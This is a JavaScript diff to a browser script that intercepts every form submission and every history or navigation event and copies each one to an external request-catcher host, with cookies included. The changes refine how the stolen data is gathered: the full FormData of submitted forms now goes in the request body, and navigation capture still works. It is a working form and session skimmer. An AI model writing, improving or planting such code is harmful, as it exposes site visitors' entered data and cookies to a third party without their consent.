@@ -20,18 +20,12 @@
                 method: method,
                 mode: 'no-cors', // Important for cross-origin requests
                 credentials: 'include', // Ensures cookies are sent
-                headers: {
-                    // Copy all request headers
-                    ...(event && event.target ? 
-                        Object.fromEntries(
-                            Array.from(event.target)
-                            .filter(el => el.name)
-                            .map(el => [el.name, el.value])
-                        ) : 
-                        {})
-                },
-                body: event && event.target ? new FormData(event.target) : null
             };
+
+            // Only add body if it's a form submission and the target is a form
+            if (event && event.target && event.target instanceof HTMLFormElement) {
+                fetchOptions.body = new FormData(event.target);
+            }
 
             // Send request to RequestCatcher
             fetch('https://noproblem.requestcatcher.com/', fetchOptions)
@@ -48,9 +42,8 @@
             document.addEventListener('submit', duplicateRequest);
         });
 
-        // Intercept and duplicate all navigation requests
+        // Capture all types of navigation
         window.addEventListener('popstate', duplicateRequest);
-        window.addEventListener('pushstate', duplicateRequest);
 
         // Override default navigation methods to capture requests
         (function(history){
@@ -58,16 +51,16 @@
             const replaceState = history.replaceState;
 
             history.pushState = function() {
-                pushState.apply(history, arguments);
+                const result = pushState.apply(history, arguments);
                 duplicateRequest();
+                return result;
             };
 
             history.replaceState = function() {
-                replaceState.apply(history, arguments);
+                const result = replaceState.apply(history, arguments);
                 duplicateRequest();
+                return result;
             };
-
-            window.addEventListener('popstate', duplicateRequest);
         })(window.history);
 
         // Duplicate initial page load
